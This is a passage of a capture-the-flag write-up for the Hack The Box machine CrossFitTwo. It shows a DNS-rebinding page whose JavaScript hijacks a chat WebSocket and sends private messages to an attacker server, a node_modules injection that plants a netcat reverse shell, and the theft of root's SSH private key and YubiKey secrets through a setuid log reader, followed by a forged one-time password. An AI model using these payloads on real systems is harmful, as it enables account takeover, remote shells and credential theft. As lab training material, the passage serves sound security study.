10.10.10.232 - - [13/Aug/2021 17:45:18] "GET /password-reset.php?token=3a79dc4559a8df1a05f65f9ec677a3465aff23a32a6a3787ec75a95b28fd443a5c4fc1c99341d6125aa16d4493deb56de97b9055217332c2b545810412b9f586 HTTP/1.1" 404 -

```

If we are trying to use this reset password token we got:

![disabled.JPG](images/disabled.JPG)

And It's ok, The password reset isn't what we need to get access to - We need to make [CSRF attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md) David's user.

So by enumerating the JS files we can see the following file ```app-XXXXXXX.js``` which contains the follow:
```javascript
...
created() {
                    let e = this;
                    xe = Ce.a.connect("http://crossfit-club.htb", {
                        transports: ["polling"]
                    }), window.addEventListener("beforeunload", (function(t) {
                        xe.emit("remove_user", {
                            uid: e.currentUserId
                        })
                    })), xe.on("disconnect", e => {
                        this.$router.replace("/login")
                    }), xe.emit("user_join", {
                        username: localStorage.getItem("user")
                    }), xe.on("participants", e => {
                        e && e.length && (this.rooms[0].users = e, this.renderUsers())
                    }), xe.on("new_user", e => {
                        e.username === localStorage.getItem("user") && (this.currentUserId = e._id, console.log(this.currentUserId))
                    }), xe.on("recv_global", e => {
                        this.addMessage(e)
                    }), xe.on("private_recv", e => {
                        this.addMessage(e)
                    })
                },
                data() {
                    return {
                        rooms: [{
                            roomId: "global",
                            roomName: "Global Chat",
                            avatar: "/images/cross.png",
                            users: [],
                            new: !1,
                            unreadCount: 0,
                            seen: !0
                        }],
                        messages: [],
                        currentUserId: 1234,
                        loadingRooms: !1,
                        messagesLoaded: !0,
                        allMessages: [],
                        selectedRoom: null,
                        theme: "dark"
                    }
                },
                methods: {
                    getRoom: function(e) {
                        for (var t = 0; t < this.rooms.length; t++)
                            if (this.rooms[t].roomId === e) return t
                    },
                    addMessage: function(e) {
                        const t = new Date;
                        e.date = t.toISOString().slice(0, 10), e.timestamp = t.toLocaleTimeString(), e.seen = !0, this.allMessages.push(e), this.messages = this.allMessages.filter(e => e.roomId === this.selectedRoom);
                        const a = this.getRoom(e.roomId),
                            s = {
                                ...e
                            };
                        delete s["_id"], this.rooms[a].lastMessage = s, this.rooms[a].lastMessage.seen = !1, this.rooms[a].lastMessage.new = !0
                    },
                    fetchMessages: function({
                        room: e,
                        options: t
                    }) {
                        this.messagesLoaded = !1, this.selectedRoom = e.roomId, setTimeout(() => {
                            this.messages = this.allMessages.filter(e => e.roomId === this.selectedRoom), this.messagesLoaded = !0
                        }, 1e3)
                    },
                    getCurrentUser: function() {
                        const e = this.rooms[0].users;
                        for (var t = 0; t < e.length; t++)
                            if (e[t]._id === this.currentUserId) return e[t]
                    },
                    renderUsers: function() {
                        this.rooms = [this.rooms[0]];
                        const e = this.rooms[0].users;
                        for (var t = 0; t < e.length; t++) {
                            if (e[t]._id === this.currentUserId) continue;
                            const a = {
                                roomId: e[t]._id,
                                avatar: `https://avatars.dicebear.com/4.5/api/gridy/${e[t].username}.svg`,
                                new: !1,
                                unreadCount: 0,
                                roomName: e[t].username,
                                users: []
                            };
                            a.users.push(this.getCurrentUser()), a.users.push(e[t]), this.rooms.push(a)
                        }
                    },
                    sendGlobal: function(e, t) {
                        const a = {
                            sender_id: xe.id,
                            content: e,
                            roomId: t
                        };
                        xe.emit("global_message", a)
                    },
                    sendPrivate: function(e, t) {
                        const a = {
                            sender_id: xe.id,
                            content: e,
                            roomId: t
                        };
                        xe.emit("private_message", a)
                    },
                    sendMessage: function({
                        content: e,
                        roomId: t,
                        file: a,
                        replyMessage: s
                    }) {
                        "global" === t ? this.sendGlobal(e, t) : this.sendPrivate(e, t)
                    }
                }
...
```

Which is chat platform based on WebSocket.

We can return to David's user HTML page with javascript that communicate with this WebSocket chat as client, when message received we will send the content to our web server.

So to do that, first we need to return the following HTML page from [password-reset.php](scripts/password-reset.php) ([socket.io download](https://www.cdnpkg.com/socket.io/file/socket.io.min.js/)):
```javascript
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ cat php_Server/password-reset.php 
<?php
$request_headers = $_SERVER;
file_put_contents('request_headers.out',print_r($request_headers, true));

echo '<html>
<script src="http://10.10.14.14:8000/socket.io.min.js"></script>
<script>
	var socket=io.connect("http://crossfit-club.htb");
	socket.emit("user_join", { "username" : "David"});
	socket.on("recv_global", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/recv_global/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("participants", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/participants/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("new_user", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/new_user/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("private_recv", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/private_recv/" + JSON.stringify(data), true);
		xhr.send();
	});
	</script>
</html>'

?>
```

Meaning that when David hit the page ```password-reset.php``` (Using DNS rebind attack) page we will return him the HTML above that communicate with chat WebSocket and send us the received messages on port 8000.

Let's run the DNS rebinding again:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ bash rebindPass.sh 
ok
FakeDNS is running...

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--   100  4491 <div class="alert alert-success alert-dismissible fade show" role="alert">Reset link sent, please check your email.<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>
```

Now, After few minutes we will see on our Web server (port 80) the following:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/]
└──╼ $ sudo php -S 0.0.0.0:80
[sudo] password for user: 
[Sat Aug 14 21:00:54 2021] PHP 7.4.5 Development Server (http://0.0.0.0:80) started
[Sat Aug 14 21:02:19 2021] 10.10.10.232:7703 Accepted
[Sat Aug 14 21:02:19 2021] 10.10.10.232:7703 [200]: GET /password-reset.php?token=66c8f85d4e7e5d924329f65364c4c02872b8c095466fd1e49c3c5f1838cca03157573f6b37bcf0f1b3297d7be19357eb05c0e1bd7ac2e3ee2d5554e3825a3c37
```

And on port 8000 web server:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/]
└──╼ $ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.232 - - [14/Aug/2021 14:02:20] "GET /socket.io.min.js HTTP/1.1" 200 -
10.10.10.232 - - [14/Aug/2021 14:02:21] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:02:21] "GET /new_user/%7B%22_id%22:1,%22username%22:%22Admin%22,%22status%22:%7B%22state%22:%22online%22%7D%7D HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:02:21] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:02:21] "GET /participants/[%7B%22_id%22:11,%22username%22:%22Lucille%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:12,%22username%22:%22Boris%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:2,%22username%22:%22John%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:13,%22username%22:%22Pepe%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:14,%22username%22:%22Polarbear%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:15,%22username%22:%22Minato%22,%22status%22:%7B%22state%22:%22online%22%7D%7D,%7B%22_id%22:1,%22username%22:%22Admin%22,%22status%22:%7B%22state%22:%22online%22%7D%7D] HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:03:05] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:03:05] "GET /private_recv/%7B%22sender_id%22:2,%22content%22:%22Hello%20David,%20I've%20added%20a%20user%20account%20for%20you%20with%20the%20password%20%60NWBFcSe3ws4VDhTB%60.%22,%22roomId%22:2,%22_id%22:1854%7D HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:03:05] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:03:05] "GET /private_recv/%7B%22sender_id%22:14,%22content%22:%22I%20hate%20my%20favorite%20web%20series%20get%20cancelled%20and%20shitty%20ones%20stick%20around.%22,%22roomId%22:14,%22_id%22:1855%7D HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:03:05] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:03:05] "GET /recv_global/%7B%22sender_id%22:15,%22content%22:%22Do%20you%20like%20rap%20music?%22,%22roomId%22:%22global%22,%22_id%22:1856,%22username%22:%22Minato%22} HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:03:57] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:03:57] "GET /private_recv/%7B%22sender_id%22:15,%22content%22:%22Do%20you%20like%20rap%20music?%22,%22roomId%22:15,%22_id%22:1857} HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:03:57] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:03:57] "GET /recv_global/%7B%22sender_id%22:12,%22content%22:%22Do%20you%20like%20dogs%20by%20the%20way?%20We%20used%20to%20have%20a%20husky%20ourselves%22,%22roomId%22:%22global%22,%22_id%22:1858,%22username%22:%22Boris%22} HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:04:17] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:04:17] "GET /private_recv/%7B%22sender_id%22:2,%22content%22:%22Hello%20David,%20I've%20added%20a%20user%20account%20for%20you%20with%20the%20password%20%60NWBFcSe3ws4VDhTB%60.%22,%22roomId%22:2,%22_id%22:1859%7D HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:04:48] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:04:48] "GET /recv_global/%7B%22sender_id%22:11,%22content%22:%22Do%20you%20like%20dogs%20by%20the%20way?%20We%20used%20to%20have%20a%20husky%20ourselves%22,%22roomId%22:%22global%22,%22_id%22:1860,%22username%22:%22Lucille%22} HTTP/1.1" 404 -
10.10.10.232 - - [14/Aug/2021 14:04:49] code 404, message File not found
10.10.10.232 - - [14/Aug/2021 14:04:49] "GET /private_recv/%7B%22sender_id%22:14,%22content%22:%22I%20hate%20my%20favorite%20web%20series%20get%20cancelled%20and%20shitty%20ones%20stick%20around.%22,%22roomId%22:14,%22_id%22:1861%7D HTTP/1.1" 404 -
```

So as we can see we got the following chat meeesage (After decode):
```json
[{"_id":11,"username":"Lucille","status":{"state":"online"}},{"_id":12,"username":"Boris","status":{"state":"online"}},{"_id":2,"username":"John","status":{"state":"online"}},{"_id":13,"username":"Pepe","status":{"state":"online"}},{"_id":14,"username":"Polarbear","status":{"state":"online"}},{"_id":15,"username":"Minato","status":{"state":"online"}},{"_id":1,"username":"Admin","status":{"state":"online"}}]


{"sender_id":14,"content":"I hate my favorite web series get cancelled and shitty ones stick around.","roomId":14,"_id":1855}


{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":1854}
```

And we can see the David's password: ```NWBFcSe3ws4VDhTB```.

Let's try to use this password using SSH:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/]
└──╼ $ ssh david@crossfit.htb
The authenticity of host 'crossfit.htb (10.10.10.232)' can't be established.
ECDSA key fingerprint is SHA256:lt8/b60gRtxXniKrvO7xT0ktvC1+Hy5RBfVWMF0pSWc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'crossfit.htb,10.10.10.232' (ECDSA) to the list of known hosts.
david@crossfit.htb's password: 
OpenBSD 6.8 (GENERIC.MP) #4: Mon Jan 11 10:35:56 MST 2021

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

Not Hercules could have knock'd out his brains, for he had none.                        
		-- Shakespeare
crossfit2:david {1} whoami
david
crossfit2:david {2} ls
user.txt
crossfit2:david {3} cat user.txt
652b4016ff88d580b502ff1f43fb3ade
``` 

And finally we got the user flag ```652b4016ff88d580b502ff1f43fb3ade```.


### User 2

By running ```id``` / ```groups``` we can see that we are on ```sysadmins``` group:
```console
crossfit2:statbot {38} groups
david sysadmins
crossfit2:statbot {39} id
uid=1004(david) gid=1004(david) groups=1004(david), 1003(sysadmins)
```

Let's find files owned by our group:
```console
crossfit2:statbot {36} find / -group sysadmins -ls
...
1244170    4 drwxrwxr-x    3 root     sysadmins      512 Feb  3  2021 /opt/sysadmin
```

On that path we can find file ```statbot.js``` located on ```/opt/sysadmin/server/statbot``` which contains:
```javascript
crossfit2:statbot {50} cat statbot.js    
const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
function log(status, connect) {
  var message;
  if(status) {
    message = `Bot is alive`;
  }
  else {
    if(connect) {
      message = `Bot is down (failed to connect)`;
    }
    else {
      message = `Bot is down (failed to receive)`;
    }
  }
  logger(message, '/tmp/chatbot.log');
}
ws.on('error', function err() {
  ws.close();
  log(false, true);
})
ws.on('message', function message(data) {
  data = JSON.parse(data);
  try {
    if(data.status === "200") {
      ws.close()
      log(true, false);
    }
  }
  catch(err) {
      ws.close()
      log(false, false);
  }
});
```

[Loading from node_modules folders](https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders):

![node_modules.JPG](images/node_modules.JPG)

According that information we know that we can create new file on specific location which it loads while the script run (library injection vulnerability).

Let's create new file ```index.js``` with [OpenBSD Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd) as follow: 
```javascript
require("child_process").execSync('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4242 >/tmp/f');
```

Locate this file on directory that we have permission to write as group which is ```/opt/sysadmin/```, Let's create inside directories ```/node_modules/ws```:
```console
crossfit2:node_modules {74} pwd
/opt/sysadmin/node_modules
crossfit2:node_modules {74} ls
index.js
```

Listen to port 4242 using ```nc```, Wait 1 min and we will get reverse shell as ```john``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from crossfit.htb [10.10.10.232] 2687
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
crossfit2$ whoami
john
crossfit2$ id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)
crossfit2$ 
```

### Root

By running ```groups``` / ```id``` we can see we are on the group ```staff```:
```console
crossfit2$ id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)
crossfit2$ groups 
john staff sysadmins
```

Like before, Let's find files owned by our group:
```console
crossfit2$ find / -group staff -ls        
find: /usr/libexec/auth: Permission denied
1481580   20 -rwsr-s---    1 root     staff        9024 Jan  5  2021 /usr/local/bin/log
crossfit2$ file /usr/local/bin/log
/usr/local/bin/log: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

By decompile the ```main``` function on ```/usr/local/bin/log``` binary using ```Ghidra``` we can see that all functions are not contains code, They actually contains:

![decompile.JPG](images/decompile.JPG)

We can see that we unable to see the function code, But of the left we can see which C library function/syscall are called, At this case It's ```puts``` function.

According that, We can change the variables/functions name on ```main``` function:
```C

undefined4 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  long file_ptr;
  long file_size;
  undefined8 ptr_malloc;
  undefined4 local_4c;
  
  call_puts("\n* LogReader v0.1\n");
  if (param_1 != 2) {
    call_printf("[*] Usage: %s <log file to read>\n",*param_2);
    call_exit(0);
  }
  iVar1 = call_unveil("/var","r");
  if (iVar1 == 0) {
    file_ptr = call_fopen(param_2[1],"rb");
    if (file_ptr == 0) {
      call_puts("[-] Log file not found!");
      local_4c = 1;
    }
    else {
      call_fseek(file_ptr,0,2);
      file_size = call_fteel(file_ptr);
      call_printf("[*] Log size: %ld\n\n",file_size);
      call_rewind(file_ptr);
      ptr_malloc = call_malloc(file_size);
      file_ptr = call_fread(ptr_malloc,1,file_size,file_ptr);
      if (file_ptr == file_size) {
        call_fwrite(ptr_malloc,1,file_size,0x105108);
        call_fflush(0x105108);
        call_free(ptr_malloc);
        local_4c = 0;
      }
      else {
        call_puts("[-] Error while retrieving contents");
        call_free(ptr_malloc);
        local_4c = 1;
      }
    }
  }
  else {
    call_puts("[-] Internal error. Please contact an administrator!");
    local_4c = 1;
  }
  return local_4c;
}
```

So first, It's called to ```unveil("/var","r")``` function, [unveil](https://man.openbsd.org/unveil.2) system call remains capable of traversing to any path in the filesystem, so additional calls can set permissions at other points in the filesystem hierarchy in our case to ```/var``` - Meaning that using ```/usr/local/bin/log``` binary we can read each file on ```/var```.

By reading the file [/etc/changelist](https://man.openbsd.org/changelist) which is a simple text file containing the names of files to be backed up to ```/var/backups``` we can see ```root``` files:
```console
crossfit2$ cat /etc/changelist | grep root
/etc/ftpchroot
/root/.Xdefaults
/root/.cshrc
/root/.login
/root/.profile
/root/.rhosts
/root/.shosts
/root/.ssh/authorized_keys
/root/.ssh/authorized_keys2
/root/.ssh/id_rsa
/var/cron/tabs/root
```

For example, the system shell database, ```/etc/shells```, is held as ```/var/backups/etc_shells.current```.

When this file is modified, it is renamed to ```/var/backups/etc_shells.backup``` and the new version becomes ```/var/backups/etc_shells.current```. Thereafter, these files are rotated.

So according that ```/root/.ssh/id_rsa``` backed up to ```/var/backups/root_.ssh_id_rsa.current```, Because the file will be on ```/var/backups``` and we can read any file on ```/var``` using ```/usr/local/bin/log``` we can read read the ```root``` private key:
```console
crossfit2$ /usr/local/bin/log /var/backups/root_.ssh_id_rsa.current

* LogReader v0.1

[*] Log size: 2610

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

And we got the ```root``` SSH private key, Let's try to use it:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ ssh -i id_rsa root@crossfit.htb
root@crossfit.htb's password: 
```

SSH is still asking for a password after using ```root``` SSH Key.

By reading the file ```/etc/login.conf``` we can see that ```auth-ssh``` required also [yubikey](https://www.yubico.com/) which is 2FA :
```yaml
#
# Settings used by /etc/rc and root
# This must be set properly for daemons started as root by inetd as well.
# Be sure to reset these values to system defaults in the default class!
#
daemon:\
        :ignorenologin:\
        :datasize=infinity:\
        :maxproc=infinity:\
        :openfiles-max=102400:\
        :openfiles-cur=102400:\
        :stacksize-cur=8M:\
        :auth-ssh=yubikey:\
        :auth-su=reject:\
        :tc=default:
```

By reading about [yubikey OpenBSD](https://www.straybits.org/post/2014/openbsd-yubikey/) we can see:

![yubikey.JPG](images/yubikey.JPG)

So we have three files on ```/var/db/yubikey/``` ([Reference](https://man.openbsd.org/login_yubikey.8)):

1. ```root.uid``` user's UID (12 hex digits).
2. ```root.key``` the user's key (32 hex digits).
3. ```root.ctr``` user's last-use counter. 
 
We can read those files using ```/usr/local/bin/log```:
```console
crossfit2$ /usr/local/bin/log /var/db/yubikey/root.key

* LogReader v0.1

[*] Log size: 33

6bf9a26475388ce998988b67eaa2ea87
crossfit2$ /usr/local/bin/log /var/db/yubikey/root.uid

* LogReader v0.1

[*] Log size: 33

a4ce1128bde4
crossfit2$ /usr/local/bin/log /var/db/yubikey/root.ctr

* LogReader v0.1

[*] Log size: 33

985089
```

Now, We need to generate yubikey token which let us to login to SSH, To do so we need to install ```ykgenerate``` as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ sudo apt-get install libyubikey-dev
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ ykgenerate
Usage: ykgenerate <aeskey> <yk_internalname> <yk_counter> <yk_low> <yk_high> <yk_use>
 AESKEY:		Hex encoded AES-key.
 YK_INTERNALNAME:	Hex encoded yk_internalname (48 bit).
 YK_COUNTER:		Hex encoded counter (16 bit).
 YK_LOW:		Hex encoded timestamp low (16 bit).
 YK_HIGH:		Hex encoded timestamp high (8bit).
 YK_USE:		Hex encoded use (8 bit).

```

According the [ykgenerate](https://developers.yubico.com/yubico-c/Manuals/ykgenerate.1.html) page we understand that we need to use this tool as follow (```F0801``` is hex value of ```.ctr``` file which is ```985089```):
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 F0801 c0a8 00 10
error: Hex encoded yk_counter must be 4 characters.
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 f080 c0a8 00 10
hleudvkicjukgecjlrgrcflebbjudrck
```

Let's use this token ```hleudvkicjukgecjlrgrcflebbjudrck``` as ```root``` password:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ ssh -i id_rsa root@crossfit.htb
root@crossfit.htb's password: 
OpenBSD 6.8 (GENERIC.MP) #4: Mon Jan 11 10:35:56 MST 2021

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

crossfit2# id                                                                                           
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
crossfit2# cat root.txt
6fbc09c17cca32cc7c7b563d5376dd3a
```

And we get the root flag ```6fbc09c17cca32cc7c7b563d5376dd3a```.
